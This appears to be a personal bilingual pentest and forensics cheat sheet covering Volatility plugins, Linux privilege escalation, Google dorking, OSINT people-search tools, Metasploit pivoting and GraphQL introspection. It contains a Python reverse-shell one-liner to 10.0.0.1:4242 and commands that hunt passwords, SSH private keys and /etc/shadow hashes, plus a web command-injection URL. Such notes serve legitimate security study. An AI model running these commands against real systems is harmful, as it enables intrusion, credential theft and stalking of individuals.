| **netscan**                       |                                   |
+-----------------------------------+-----------------------------------+
| f**socket**                       | **To detect listening sockets for |
|                                   | any protocol (TCP, UDP, RAW,      |
|                                   | etc).**                           |
|                                   |                                   |
|                                   | **This command is for x86 and x64 |
|                                   | Windows XP and Windows 2003       |
|                                   | Server only.**                    |
+-----------------------------------+-----------------------------------+
| **netscan**                       | **To scan for network artifacts   |
|                                   | in 32- and 64-bit Windows Vista,  |
|                                   | Windows 2008 Server and Windows   |
|                                   | 7.**                              |
+-----------------------------------+-----------------------------------+
| **connscan**                      | **The connscan plugin is a        |
|                                   | scanner for TCP connections.**    |
+-----------------------------------+-----------------------------------+
| **consoles / cmdscan**            | **which extracts command history  |
|                                   | by scanning for                   |
|                                   | \_CONSOLE_INFORMATION.**          |
+-----------------------------------+-----------------------------------+
| **procdump**                      | **-p : PID of the process**       |
|                                   |                                   |
|                                   | **extract process.**              |
+-----------------------------------+-----------------------------------+
| **memdump**                       | **-p : PID of the process**       |
|                                   |                                   |
|                                   | **extract process as a dump file. |
|                                   | it represents the addressable     |
|                                   | memory of the process.**          |
+-----------------------------------+-----------------------------------+
| **filescan**                      | **scan for file inside the dump** |
+-----------------------------------+-----------------------------------+
| **dumpfiles**                     | **get file inside the dump**      |
|                                   |                                   |
|                                   | **-D : destination directory**    |
|                                   |                                   |
|                                   | **-Q : dump file physical address |
|                                   | OFFSET**                          |
|                                   |                                   |
|                                   | **-n : output file name**         |
+-----------------------------------+-----------------------------------+
| **foremost -v -i dump -o          | **extract files from dump**       |
| forefore**                        |                                   |
+-----------------------------------+-----------------------------------+
| **clipboard**                     | **This command recovers data from |
|                                   | users\' clipboards (              |
|                                   | presse-papier ).**                |
+-----------------------------------+-----------------------------------+
| **windows**                       | **This command enumerates all     |
|                                   | windows (visible or not) in all   |
|                                   | desktops of the system**          |
+-----------------------------------+-----------------------------------+
| **iehistory**                     | **show internet history**         |
+-----------------------------------+-----------------------------------+
|                                   |                                   |
+-----------------------------------+-----------------------------------+
|                                   |                                   |
+-----------------------------------+-----------------------------------+
|                                   |                                   |
+-----------------------------------+-----------------------------------+
|                                   |                                   |
+-----------------------------------+-----------------------------------+
|                                   |                                   |
+-----------------------------------+-----------------------------------+
|                                   |                                   |
+-----------------------------------+-----------------------------------+

-   **When you are suggested profiles ( by imageinfo plugins ), how to
    > choose the correct one ? One of the technique is to compare the
    > value of the service pack field like the image below :**

![](media/image368.png){width="6.267716535433071in"
height="2.0694444444444446in"}

-   **Difference in name profiles :**

![](media/image170.png){width="6.267716535433071in"
height="0.4583333333333333in"}

**the number of after the "\_" is the version of the operating system (
version**

**with different changes in memory structure ).**

-   **It's different when you work on a Virtual machine file and normal
    > operating system file.**

![](media/image197.png){width="6.267716535433071in"
height="3.1944444444444446in"}

**You have to choose the right tool ( to make live captures ) depending
on what devices you are focusing on ( SSD, Disk, RAM, VM, ...)**

![](media/image57.png){width="6.267716535433071in"
height="3.263888888888889in"}

![](media/image407.png){width="4.46875in" height="3.1666666666666665in"}

**You can use these files in Volatility**

![](media/image128.png){width="6.267716535433071in"
height="4.097222222222222in"}

**Some of Windows Core processes :**

![](media/image162.png){width="6.267716535433071in" height="3.75in"}

**An other core process :**

![](media/image88.png){width="5.572916666666667in"
height="3.6666666666666665in"}

-   **Work in conjunction with lsass.exe.**

**By looking for any deviations ( of each characteristic ) from known
normal of these processes, sometimes you are able to easily find
evidence of attacker activity malware and so on.**

![](media/image304.png){width="6.267716535433071in"
height="0.6111111111111112in"}

-   **A hive in the Windows Registry is the name given to a major
    > section of the registry that contains registry keys, registry
    > subkeys, and registry values.**

```{=html}
<!-- -->
```
-   ## Les Rootkit :

**Un rootkit est un programme qui maintient un accès frauduleux à un
système informatique et cela le plus discrètement possible, leur
détection est difficile, parfois même impossible tant que le système
d\'exploitation fonctionne.**

**Outils :**

  -----------------------------------------------------------------------
  **rkhunter**                        **détection de rootkit**
  ----------------------------------- -----------------------------------
  **chkrootkit**                      **détection de rootkit**

  **Lynis**                           **détection de malware sur Linux**

                                      

                                      

                                      

                                      
  -----------------------------------------------------------------------

-   ## MISC

```{=html}
<!-- -->
```
-   **A Loopback Device ( /dev/loop ) is a mechanism used to interpret
    > files as real devices ( like harddisk ). The main advantage of
    > this method is that all tools used on real disks can be used with
    > a loopback device.**

```{=html}
<!-- -->
```
-   **When you see a malicious processus, it's necessary to know and
    > find what is its parent process ( in tracking back processus ) to
    > know what happened in the past.**

```{=html}
<!-- -->
```
-   **If you find a process with the same name of another common process
    > of the operating system , it's necessary to check the file path
    > and the parent process to evaluate if it corresponds to the real
    > process and not**

> **a suspicious process with the same name.**

-   **It's also good to check when a suspicious process has started (
    > the date ).**

```{=html}
<!-- -->
```
-   **Dans le monde de l'informatique légale (computer forensics), les
    > données existent notamment sous trois états :**

    -   **En transit (data in transit) qui décrivent des données qui
        > sont en mouvement à travers un réseau ou entre deux espaces de
        > stockage.**

    -   **Au repos (data at rest). Dans cet état, les données résident
        > sur des médias non-volatiles (disques durs, cartes mémoires,
        > clés USB, etc.) et ne sont ni lues ni traitées.**

    -   **En utilisation (data in use) où les données sont utilisées sur
        > le moment par l'utilisateur ou par le CPU.**

> **Lorsque les données sont utilisées, elles sont retirées du disque
> dur et stockées temporairement dans la mémoire RAM, car bien plus
> rapide que le disque dur.**

-   **In Unix-like operating systems, a loop device ( /dev/loop0 for
    > example ) is a pseudo-device that makes a file accessible as a
    > block device." In short, a loop device allows us to present the
    > image file ( file.img for example ) to the operating system as if
    > it were an actual "disk".**

# Linux Privilege Escalation

[**[https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md#tools]{.underline}**](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md#tools)

##  System enumeration command :

+-----------------------------------+-----------------------------------+
| **uname -a**                      | **Display information about the   |
|                                   | kernel ( processor, version ,     |
| **cat /proc/version**             | distribution ... )**              |
|                                   |                                   |
| **cat /etc/issue**                |                                   |
+===================================+===================================+
| **hostname \[OPTIONS\]**          | **The *hostname*                  |
|                                   | [command](h                       |
|                                   | ttp://www.linfo.org/command.html) |
|                                   | is used to show or set a          |
|                                   | computer\'s [*host                |
|                                   | name*](htt                        |
|                                   | p://www.linfo.org/host_name.html) |
|                                   | and [*domain                      |
|                                   | name*](http://w                   |
|                                   | ww.linfo.org/domain_name.html).** |
+-----------------------------------+-----------------------------------+
| **lscpu**                         | **Display information about the   |
|                                   | architecture, the CPU, . . .**    |
+-----------------------------------+-----------------------------------+
| **ps aux**                        | **Display what services are       |
|                                   | running**                         |
| **ps -edf**                       |                                   |
+-----------------------------------+-----------------------------------+
| **whoami**                        | **Display your own hostname**     |
+-----------------------------------+-----------------------------------+
| **id**                            | **Display some information about  |
|                                   | the current user**                |
+-----------------------------------+-----------------------------------+
| **sudo -l**                       | **Display what command you can    |
|                                   | run at sudo what you can          |
|                                   | manipulate as sudo**              |
+-----------------------------------+-----------------------------------+
| **cat /etc/passwd**               | **Display informations about all  |
|                                   | users and groups**                |
| **cat /etc/shadow**               |                                   |
|                                   |                                   |
| **cat /etc/group**                |                                   |
+-----------------------------------+-----------------------------------+
| **history**                       | **Display the history about the   |
|                                   | commands executed**               |
+-----------------------------------+-----------------------------------+
| **ifconfig**                      | **Print out common informations   |
|                                   | about networking**                |
| **ip a**                          |                                   |
|                                   |                                   |
| **ip route**                      |                                   |
+-----------------------------------+-----------------------------------+
| **arp -a**                        | **Print out the ARP table**       |
|                                   |                                   |
| **ip neigh**                      |                                   |
+-----------------------------------+-----------------------------------+
| **netstat ano**                   | **Print out what ports are        |
|                                   | opened, state of socket,          |
|                                   | connections . . .**               |
+-----------------------------------+-----------------------------------+
| **grep \--color=auto -rnw '/' -ie | **This long command is going to   |
| "PASSWORD=" \--color=always 2\>   | look for the word "PASSWORD=" in  |
| /dev/null**                       | files and print it out in red     |
|                                   | color.**                          |
+-----------------------------------+-----------------------------------+
| **locate password \| more**       | **Display files that contain      |
|                                   | "password" in their names.**      |
+-----------------------------------+-----------------------------------+
| **find / -name authorized_key 2\> | **Looking for some useful         |
| /dev/null**                       | informations about SSH (keys,     |
|                                   | ...) that you can access to.**    |
| **find / -name id_rsa 2\>         |                                   |
| /dev/null**                       | **id_rsa is a common name for ssh |
|                                   | private key.**                    |
+-----------------------------------+-----------------------------------+
| **find / -user root -perm -4000   | **Looking for files that are SUID |
| -exec ls -ldb {} \\;              | enabled.**                        |
| 2\>/dev/null**                    |                                   |
|                                   |                                   |
| **wget                            |                                   |
| https://raw.                      |                                   |
| githubusercontent.com/Anon-Exploi |                                   |
| ter/SUID3NUM/master/suid3num.py** |                                   |
+-----------------------------------+-----------------------------------+
| **getcap -r / 2\>/dev/null**      | **Looking for capabilities of     |
|                                   | binaries .**                      |
+-----------------------------------+-----------------------------------+
| **Tcpdump -D**                    | **list all interfaces**           |
+-----------------------------------+-----------------------------------+
| **timeout 150 tcpdump -w cap.pcap | **inspect "veth1665bcd" traffic   |
| -i veth1665bcd**                  | if possible, and save the output  |
|                                   | in a pcap file "cap.pcap".**      |
+-----------------------------------+-----------------------------------+
| **ss -tnl**                       | **ss command is a tool that is    |
|                                   | used for displaying network       |
|                                   | socket related information on a   |
|                                   | Linux system. ( to see active     |
|                                   | socket )**                        |
+-----------------------------------+-----------------------------------+
|                                   |                                   |
+-----------------------------------+-----------------------------------+
|                                   |                                   |
+-----------------------------------+-----------------------------------+
|                                   |                                   |
+-----------------------------------+-----------------------------------+
|                                   |                                   |
+-----------------------------------+-----------------------------------+
|                                   |                                   |
+-----------------------------------+-----------------------------------+
|                                   |                                   |
+-----------------------------------+-----------------------------------+

-   **Pensez à regarder les fichiers liés aux exécutions journalières (
    > cron, ...)**

```{=html}
<!-- -->
```
-   **Some Linux Privilege Escalation tool for enumeration :**

    -   **LinPEAS**

    -   **LinEnum**

    -   **LES**

    -   **Linuxprivchecker : looking for potential CVE that can be
        > performed.**

> **It's important to run different tools ( not only one ) to not miss
> something important.**

-   ## Kernel exploitation :

    -   **Find the version of the kernel and then search for some known
        > exploit that gives you privileges and run it.**

-   ## Passwords & File Permissions exploitation :

    -   **You can type the command history or cat .bash_history and
        > check if there are some passwords written here.**

    -   **You can search some special words in all the files that can
        > lead you to find a real password.**

```{=html}
<!-- -->
```
-   **Look if you have reading permission to /etc/shadow. If you have
    > this permission, you can take the content of /etc/shadow and
    > /etc/passwd and run some script ( Like unshadow already installed
    > in Kali) that will give you an output that you are going to use to
    > bruteforce the hashes with Hashcat.**

```{=html}
<!-- -->
```
-   **If you find some private key ( id_rsa ), you can use it to connect
    > on the machine via ssh as the owner that has that private key
    > using it instead of login / password.**

> **for each known and authorized public key, you can connect to the
> machine via the private key.**
>
> **example :**
>
> **chmod 600 root_private_key ( On doit rendre la clef inaccessible au
> autre )**
>
> **ssh -i root_private_key root@192.168.4.67**

-   ## Sudo exploitation :

```{=html}
<!-- -->
```
-   ### LD_PRELOAD :

    -   **If you have this variable running as root, you can run your
        > own code ( and so invoke a shell ):**

![](media/image42.png){width="4.604166666666667in" height="2.6875in"}

![](media/image89.png){width="6.267716535433071in"
height="1.5972222222222223in"}

**Here , the command find has to be running as sudo permission.**

-   ## SUID Exploitation

    -   **Search in
        > [[https://gtfobins.github.io]{.underline}](https://gtfobins.github.io)
        > and google to know if you can exploit what you have find as
        > SUID file, binaries.**

```{=html}
<!-- -->
```
-   ### Shared Object Injection :

    -   **1) Search for some executable with SUID enabled**

```{=html}
<!-- -->
```
-   **2) Run it with Strace.**

```{=html}
<!-- -->
```
-   **3) Looking for some Shared library that the program try to open or
    > access :**

![](media/image349.png){width="6.267716535433071in"
height="2.4722222222222223in"}

-   **4) Write your fake library like this :**

![](media/image289.png){width="6.267716535433071in"
height="1.3055555555555556in"}

-   **5) Then compile this fake library and execute the SUID program (en
    > écrasant la librairie de base si possible ).**

**gcc -shared -fPIC -o \[ABSOLUTE_PATH.so\]**

> **\[ABSOLUTE_PATH.sc\]**

-   ### VIA Environment Variables :

    -   **1) Search for some executable with SUID**

> **enabled**

-   **2) Run the command strings on that executable to see if there is
    > something executed that uses Environment Variables "shortcut" (
    > \$PATH ).**

> **Example : "service apache2 start ".The program service is using the
> environment variable \$PATH to be found without absolute path.**

-   **4) Write your own payloads ( In this example, this is a fake
    > "service" program ) that will be executed instead of the real
    > service program.**

![](media/image9.png){width="6.267716535433071in"
height="0.3055555555555556in"}

![](media/image107.png){width="6.267716535433071in"
height="0.2361111111111111in"}

-   **5) Put your payload directory at the first position in PATH
    > environment variable :**

![](media/image173.png){width="6.267716535433071in"
height="0.18055555555555555in"}

-   **6) Run the SUID program.**

**Another way to perform this :**

**﻿**![](media/image76.png){width="5.408506124234471in"
height="5.5612379702537185in"}

-   **Vérifier si des fichiers exécutés de façon récurrente ( avec CRON
    > ) sont disponible et modifiable. On pourrait les remplacer par un
    > autre fichier ( ayant le même nom ) pour invoquer un shell ou
    > autre ...**

```{=html}
<!-- -->
```
-   **Si les commandes nano,cp .. ( commande d\'écriture ) sont
    > utilisables en mode SUID-bit, on peut l'utiliser pour créer un
    > nouveau user dans le fichier /etc/passwd avec les droits root et
    > se connecter dessus :**

![](media/image378.png){width="4.635416666666667in" height="1.8125in"}

![](media/image65.png){width="5.770833333333333in"
height="0.7916666666666666in"}

![](media/image46.png){width="6.267716535433071in" height="3.125in"}

-   ### Exploiting SUID permission in cpulimit command :

> ![](media/image49.png){width="5.447916666666667in"
> height="1.3333333333333333in"}

**entre temps : cd /ignite/**

-   ## RCE through mysql command on a writeable directory :

![](media/image175.png){width="5.479166666666667in" height="3.5in"}

**URL ( in the context of the screenshot ) :
[[http://192.168.1.167:8080/raj.php?cmd=id]{.underline}](http://192.168.1.167:8080/raj.php?cmd=id)**

-   ## Lxd Privilege Escalation

**LXD est un logiciel libre développé par Canonical pour simplifier la**

> **manipulation de conteneurs de logiciels ( comme Docker ) à la
> manière d\'un hyperviseur de VM.**
>
> **Il a l\'avantage d\'être beaucoup plus léger qu\'une machine
> virtuelle classique, car il ne virtualise pas un OS complet mais
> partage de nombreuses ressources avec l\'OS hôte. On parle
> d\'environnements virtuels**

**LXD has a root process that carries out actions for anyone with
write**

**access to the LXD UNIX socket.**

> **A member of the local "lxd" group can sometimes instantly escalate
> the privileges to root on the host operating system. This is
> irrespective of whether that user has been granted sudo rights and
> does not require them to enter their password.**

**For more detail:**

[**[https://www.hackingarticles.in/lxd-privilege-escalation/]{.underline}**](https://www.hackingarticles.in/lxd-privilege-escalation/)

-   ## Python Library Hijacking

### Method 1 : From Bad Write Permission

-   Prérequis :

    -   SUDO ou SUID sur un fichier python à exécuter.

    -   Une lib est importé dans ce fichier

    -   Accès en écriture sur cette lib.

```{=html}
<!-- -->
```
-   Exploitation :

    -   Modifier la lib et injecter un Reverse shell en python dans le
        > code :

import
socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",4242));os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;
pty.spawn(\"/bin/bash\")\'

### Method 2 : Priority Order

-   Prérequis :

    -   SUDO ou SUID sur un fichier python à exécuter.

    -   Une lib est importée dans ce fichier.

    ```{=html}
    <!-- -->
    ```
    -   Accès en écriture sur le dossier ou se trouve ce fichier.

```{=html}
<!-- -->
```
-   Exploitation :

    -   Créer un fichier python avec le même nom que la lib importée
        > dans le même dossier sur le fichier python vulnérable ( il va
        > être pris en compte en priorité dans l'importation des lib ).

    -   Écrire un Revers shell en python dans ce nouveau fichier.

### Method 3 : PYTHONPATH Environment Variable

Théorie : This vulnerability is based on the Python Library that is
searching through the Python PATH Environment Variable. This variable
holds a list of directories where the python searches for the different
directories for the imported modules. If an attacker can change or
modify that variable then they can use it to elevate privileges on the
target machine.

-   Prérequis :

    -   SUDO ou SUID sur un fichier python à exécuter.

    -   Une lib est importée dans ce fichier.

    ```{=html}
    <!-- -->
    ```
    -   Pouvoir faire des changements dans la variable d'env PYTHONPATH.

```{=html}
<!-- -->
```
-   Exploitation :

![](media/image339.png){width="5.708333333333333in"
height="1.5729166666666667in"}

![](media/image54.png){width="7.846006124234471in"
height="1.4313659230096238in"}

![](media/image38.png){width="4.53125in" height="1.78125in"}

19) **Gathering information**

-   **With Search Engines to gather information, you can find about the
    > target:**

    -   **Sensitive files and folders**

    -   **Username, password, email,..**

    -   **Server or system vulnerabilities**

    -   **Login pages**

```{=html}
<!-- -->
```
-   **Google Dorking ( or hacking ) : Computer hacking technique that
    > uses Google innate abilities to find security holes in the
    > configuration and computer code that websites use.**

```{=html}
<!-- -->
```
-   **queries database :
    > [*[https://www.exploit-db.com/google-hacking-database]{.underline}*](https://www.exploit-db.com/google-hacking-database)**

```{=html}
<!-- -->
```
-   **Example Google Dork instruction :**

+------------------------------+---------------------------------------+
| **filetype:pdf anonymat**    | **Retournera les documents PDF**      |
|                              |                                       |
|                              | **contenant le mot anonymat.**        |
+==============================+=======================================+
| **site:funinformatique.com   | **Trouvera toutes les pages           |
| VPN**                        | contenant**                           |
|                              |                                       |
|                              | **le mot                              |
|                              | [VPN](https://www.funinformatiq       |
|                              | ue.com/cest-quoi-vpn-bien-lutiliser/) |
|                              | dans leur texte et se trouvant dans   |
|                              | le**                                  |
|                              |                                       |
|                              | **domaine funinformatique.com**       |
+------------------------------+---------------------------------------+
| **inurl:VPN**                | **Trouvera les pages contenant le mot |
|                              | VPN dans l'adresse URL**              |
+------------------------------+---------------------------------------+
| **intitle:VPN**              | **Specifying intitle, will tell       |
|                              | google to show only those pages that  |
|                              | have the term in their html title**   |
+------------------------------+---------------------------------------+
| **filetype**                 | **Searches for specific file types.   |
|                              | filetype:pdf will looks for pdf files |
|                              | in websites. Similarly filetype:txt   |
|                              | looks for files with extension .txt** |
+------------------------------+---------------------------------------+
| **ext**                      | **Similar to filetype.**              |
+------------------------------+---------------------------------------+
| **intext**                   | **Searches the content of the page.   |
|                              | Somewhat like a plain google          |
|                              | search.**                             |
+------------------------------+---------------------------------------+
| **allintext:username         | **Search file with log extension that |
| filetype:log**               | contains "username"(on the body       |
|                              | page).**                              |
+------------------------------+---------------------------------------+
| **"search term"**            | **Force an exact-match search (       |
|                              | accolade )**                          |
+------------------------------+---------------------------------------+
| **jobs OR gates OU**         | **The pipe (\|) operator can also be  |
|                              | used in place of "OR."**              |
| **jobs \| gates**            |                                       |
+------------------------------+---------------------------------------+
| **jobs AND gates**           | **Search for X and Y.**               |
+------------------------------+---------------------------------------+
| **jobs ‑apple**              | **The character "-" Exclude a term or |
|                              | phrase. In our example, any pages     |
|                              | returned will be related to jobs but  |
|                              | not Apple (the company).**            |
+------------------------------+---------------------------------------+
| **steve \* apple**           | **" \* " : Acts as a wildcard and     |
|                              | will match any word or phrase.**      |
+------------------------------+---------------------------------------+
| **(ipad OR iphone) apple**   | **"( )" : Group multiple terms or     |
|                              | search operators to control how the   |
|                              | search is executed.**                 |
+------------------------------+---------------------------------------+
| **define:entrepreneur**      | **This will display the meaning of a  |
|                              | word**                                |
+------------------------------+---------------------------------------+
| **cache:apple.com**          | **Returns the most recent cached      |
|                              | version of a web page**               |
+------------------------------+---------------------------------------+
| **apple AROUND(4) iphone**   | **For this example, the words "apple" |
|                              | and "iphone" must be present in the   |
|                              | content and no further than four      |
|                              | words apart.**                        |
+------------------------------+---------------------------------------+
| **map:silicon valley**       | **Force Google to show map results    |
|                              | for a locational search.**            |
+------------------------------+---------------------------------------+
| **\$329 in GBP**             | **Convert one unit to another. Works  |
|                              | with currencies, weights,             |
|                              | temperatures, etc.**                  |
+------------------------------+---------------------------------------+
| **wwdc video 2010..2014**    | **Search for a range of numbers.**    |
|                              |                                       |
|                              | **In the example below, searches      |
|                              | related to "WWDC videos" are returned |
|                              | for the years 2010--2014, but not for |
|                              | 2015 and beyond.**                    |
+------------------------------+---------------------------------------+
| **steve jobs                 | **Find results from a certain date    |
| daterange:11278-13278**      | range. Uses the *Julian date* format, |
|                              | for some reason**                     |
+------------------------------+---------------------------------------+
| **site:\*.\*.microsoft.com   | **find subdomains on microsoft**      |
| ext:php**                    |                                       |
+------------------------------+---------------------------------------+
|                              |                                       |
+------------------------------+---------------------------------------+
|                              |                                       |
+------------------------------+---------------------------------------+
|                              |                                       |
+------------------------------+---------------------------------------+
|                              |                                       |
+------------------------------+---------------------------------------+
|                              |                                       |
+------------------------------+---------------------------------------+

-   **Shodan almost do the same but in more high range: Shodan search on
    > "internet" et Google dorking search on" World Wide Web". You can
    > filter your research by country , port, Os system,\...**

```{=html}
<!-- -->
```
-   **people\'s search engine :**

    -   **checkusernames.com (pseudo research in S.network).**

    -   **[[https://webmii.com]{.underline}](https://webmii.com) ( by
        > first and last name )**

    -   **....**

```{=html}
<!-- -->
```
-   **WayBackMachine : To find Web Archives.**

```{=html}
<!-- -->
```
-   **FOCA ( On Windows ): Fingerprinting Organisations which Collected
    > Metadata Archives ( of a website).**

```{=html}
<!-- -->
```
-   **Google Alert :**

**Alert a person when a new content about a "string**

> **character" is pop on the web.**

# Format ELF

##  Section in ELF

+-----------------------------------+-----------------------------------+
| **.data**                         | **Données initialisées            |
|                                   | déclarées**                       |
+===================================+===================================+
| **.rodata**                       | **Données initialisées déclarées  |
|                                   | en lecture seule**                |
+-----------------------------------+-----------------------------------+
| **.bss**                          | **Données non initialisées        |
|                                   | déclarées**                       |
+-----------------------------------+-----------------------------------+
| **.plt**                          | **Procedure Linkage Table. Cette  |
|                                   | section regroupe l'ensemble des   |
|                                   | fonctions que nous voulons        |
|                                   | \"importer\" de bibliothèques     |
|                                   | partagées.**                      |
|                                   |                                   |
|                                   | **Par exemple, un programme       |
|                                   | compilé avec les options par      |
|                                   | défaut sous gcc et utilisant      |
|                                   | l'appel printf va stocker dans la |
|                                   | section .plt l'adresse de la      |
|                                   | fonction printf, elle-même        |
|                                   | véritablement localisée dans la   |
|                                   | bibliothèque partagée             |
|                                   | libc.so.6.**                      |
+-----------------------------------+-----------------------------------+
|                                   |                                   |
+-----------------------------------+-----------------------------------+
|                                   |                                   |
+-----------------------------------+-----------------------------------+
|                                   |                                   |
+-----------------------------------+-----------------------------------+

## Environnement d\'exécution :

![](media/image379.png){width="2.8854166666666665in"
height="3.6458333333333335in"}

-   ***Il se peut que les sections n\'aient pas les mêmes adresses
    > (mesure de sécurité).***

> **Plus de précision :**

![](media/image56.png){width="1.329682852143482in"
height="2.825577427821522in"}![](media/image312.png){width="3.1770833333333335in"
height="2.53125in"}

![](media/image242.png){width="4.84375in" height="3.4583333333333335in"}

-   **The Program Headers (among other functions) are more often for
    > telling the memory loader where to put stuff.**

# Python

-   ## MISC

```{=html}
<!-- -->
```
-   **Python3 makes the distinction between bytes and str, when
    > converting a printable string to bytes, the method .encode() is
    > used. But this method crashes when trying to convert non-printable
    > characters like \\xFF.**

# OSINT

##  Useful tools

+-----------------------------------+-----------------------------------+
| **20minutemail**                  | **Create temporary email**        |
+===================================+===================================+
| **KeePass**                       | **Generator and keeper good       |
|                                   | password**                        |
+-----------------------------------+-----------------------------------+
| **cryptomator**                   | **Encrypt file**                  |
+-----------------------------------+-----------------------------------+
| **Onionshare**                    | **Share file over the Tor network |
|                                   | ( for being anonymous ) like      |
|                                   | "Pastebin" for file.**            |
+-----------------------------------+-----------------------------------+
| **PIC2Map.com**                   | **Géolocalisation de photo        |
|                                   | extérieur.**                      |
+-----------------------------------+-----------------------------------+
| **beenverified.com**              | **Reverse email search**          |
+-----------------------------------+-----------------------------------+
| [**[http                          | **reverse phone number**          |
| s://www.spydialer.com/]{.underlin |                                   |
| e}**](https://www.spydialer.com/) |                                   |
|                                   |                                   |
| **411.com**                       |                                   |
+-----------------------------------+-----------------------------------+
| **Bing browser**                  | **There is also reverse image     |
|                                   | tool in bing**                    |
| **Yandex browser**                |                                   |
|                                   | **Yandex is Better than google to |
|                                   | search about persons**            |
+-----------------------------------+-----------------------------------+
|                                   |                                   |
+-----------------------------------+-----------------------------------+
| **Tineye.com**                    | **reverse image search**          |
+-----------------------------------+-----------------------------------+
| **searchyellowdirectory.com**     | **Reverse phone lookup in all     |
|                                   | over the world**                  |
| **comfi.com/abook/reverse**       |                                   |
+-----------------------------------+-----------------------------------+
| **Blackbookonline.com**           | **US Public record online (       |
|                                   | plenty type of information about  |
|                                   | a person)**                       |
+-----------------------------------+-----------------------------------+
| **xlek.com**                      | **free public data search ( US    |
|                                   | tool )**                          |
+-----------------------------------+-----------------------------------+
| **dehashed.com**                  | **Data breaches reporting (       |
|                                   | password leaked, email leaked,    |
| **haveibeenpwned.com**            | ...)**                            |
+-----------------------------------+-----------------------------------+
| **webmii**                        | **Search on people in             |
|                                   | particular**                      |
+-----------------------------------+-----------------------------------+
| **Spiderfoot**                    | **Web site scanner**              |
+-----------------------------------+-----------------------------------+
| **HTTrack**                       | **Website copier ( and then       |
|                                   | expose the copie on port 8080 )** |
+-----------------------------------+-----------------------------------+
| **metagoofil**                    | **Download all document from a    |
|                                   | URL**                             |
+-----------------------------------+-----------------------------------+
| **wayback.archive.org**           | **Très bon outils pour retrouver  |
|                                   | des informations supprimé all     |
| **Resurrect pages ( plugin on     | over the internet ( social media, |
| firefox )**                       | ...)**                            |
+-----------------------------------+-----------------------------------+
| **datafakegenerator.com**         | **Nom très explicite**            |
+-----------------------------------+-----------------------------------+
| **tinfoleak**                     | **get detailed info about a       |
|                                   | Twitter user.**                   |
+-----------------------------------+-----------------------------------+
| **intelTechniques**               | **Provide huge amount of          |
|                                   | information from a Facebook ID**  |
+-----------------------------------+-----------------------------------+
| **https://osintframework.com**    | **provide plenty of source and    |
|                                   | framework about Osint**           |
+-----------------------------------+-----------------------------------+
| **https://intelx.io/signup**      | **Effectue plusieurs actions par  |
|                                   | rapport à l'OSint.**              |
+-----------------------------------+-----------------------------------+
|                                   |                                   |
+-----------------------------------+-----------------------------------+
|                                   |                                   |
+-----------------------------------+-----------------------------------+
|                                   |                                   |
+-----------------------------------+-----------------------------------+
|                                   |                                   |
+-----------------------------------+-----------------------------------+
|                                   |                                   |
+-----------------------------------+-----------------------------------+
|                                   |                                   |
+-----------------------------------+-----------------------------------+

# Metasploit

-   ## Autoroute exploit :

> **Metasploit has an autoroute exploit that can route the network in
> such a way that internal IP is accessible from outside by adding a
> route to an internal network.**
>
> **Autoroute will create a new host to connect with whose traffic will
> be redirected to the internal service.**
>
> **But, Autoroute doesn't tell us the IP Address of the new host.**
>
> **Example :**

![](media/image234.png){width="2.8020833333333335in"
height="0.9375in"}![](media/image323.png){width="4.041666666666667in"
height="0.6666666666666666in"}

-   ## Ping sweep :

**Scan addresses of a network**

**Example :**

![](media/image32.png){width="3.90625in" height="0.9791666666666666in"}

-   ## auxiliary tcp port scanner :

**Port Scanner**

**Example :**

![](media/image15.png){width="2.625in" height="0.8333333333333334in"}

# GraphQL

-   ## Definiton

**Selon la définition officielle, GraphQL est un langage de requêtes
pour API ainsi qu'un environnement pour exécuter ces requêtes.**

![](media/image295.png){width="6.267716535433071in"
height="3.986111111111111in"}

**Unlike REST APIs (where the client first interacts with arbitrary code
written by programmer(s) and this code reaches the database); the client
first interacts with GraphQL, which in turn interacts with arbitrary
code and ultimately ends talking to the database.**

![](media/image147.png){width="6.267716535433071in"
height="5.083333333333333in"}

**This change in the architecture has a lot of advantages tied to it,
for example it's possible to get all the data the client needs in a
single request (whereas REST APIs need to perform multiple requests).**

-   ## Common GraphQL endpoint :

```{=html}
<!-- -->
```
-   **/graphql/**

-   **/graphql/console/**

-   **/graphql.php**

-   **/graphiql/**

-   **/graphiql.php**

```{=html}
<!-- -->
```
-   ## GraphQL injection :

**Cette injection permet de récupérer des infos dans la base de
données.**

**Etapes :**

-   **Trouver un endpoints utilisant les GraphQL**

-   **Find the schema ( for mutation et query ) in order to know how to
    > talk to it ( What GraphQL object it interacts with ).**

> **Useful tools for this :**

![](media/image26.png){width="6.267716535433071in"
height="1.2777777777777777in"}

-   ## Useful Introspection query

+-------------------------------------------+--------------------------+
| **query{**                                | **Affiché le noms des    |
|                                           | tables de la base de     |
| **\_\_schema{**                           | donnée**                 |
|                                           |                          |
| **types{**                                |                          |
|                                           |                          |
| **name**                                  |                          |
|                                           |                          |
| **}**                                     |                          |
|                                           |                          |
| **}**                                     |                          |
|                                           |                          |
| **}**                                     |                          |
+===========================================+==========================+
| **query{**                                | **Affiche les "colonnes" |
|                                           | d'une table de la base   |
| **\_\_type(name:                          | de donnée**              |
| "\[NAME_OF_TABLE/TYPE\]"){**              |                          |
|                                           | **Autrement dit :        |
| **fields{**                               | Affiche les champs d'un  |
|                                           | type.**                  |
| **name**                                  |                          |
|                                           |                          |
| **}**                                     |                          |
|                                           |                          |
| **}**                                     |                          |
|                                           |                          |
| **}**                                     |                          |
|                                           |                          |
| **"**                                     |                          |
+-------------------------------------------+--------------------------+
| **query{**                                | **Affiche toutes les     |
|                                           | opérations autorisés.**  |
| **\_\_schema{**                           |                          |
|                                           | **Une opération est une  |
| **queryType{**                            | forme de requête dont la |
|                                           | syntaxe est déjà         |
| **fields{**                               | spécifié.**              |
|                                           |                          |
| **name**                                  | **Toutes les opérations  |
|                                           | ont un nom.**            |
| **args{name,defaultValue}**               |                          |
|                                           |                          |
| **}**                                     |                          |
|                                           |                          |
| **}**                                     |                          |
|                                           |                          |
| **}**                                     |                          |
|                                           |                          |
| **}**                                     |                          |
+-------------------------------------------+--------------------------+
| **query{\_\_schema{mutationType{          | **Affiche toutes les     |
| fields{name,args{name,defaultValue}}}}}** | mutations disponibles.** |
+-------------------------------------------+--------------------------+
|                                           |                          |
+-------------------------------------------+--------------------------+
|                                           |                          |
